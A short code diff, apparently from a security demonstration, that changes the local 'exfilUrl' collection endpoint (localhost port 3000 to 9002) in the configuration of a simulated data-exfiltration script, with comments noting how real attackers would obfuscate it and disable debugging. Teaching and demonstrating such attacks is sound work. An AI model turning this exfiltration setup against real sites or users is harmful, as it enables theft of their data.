@@ -254,7 +254,7 @@
         
         // Configuration - would be obfuscated in real attacks
         const CONFIG = {
-            exfilUrl: 'http://localhost:3000/collect',
+            exfilUrl: 'http://localhost:9002/collect',
             delay: 100,
             debug: true  // Attackers would set to false
         };
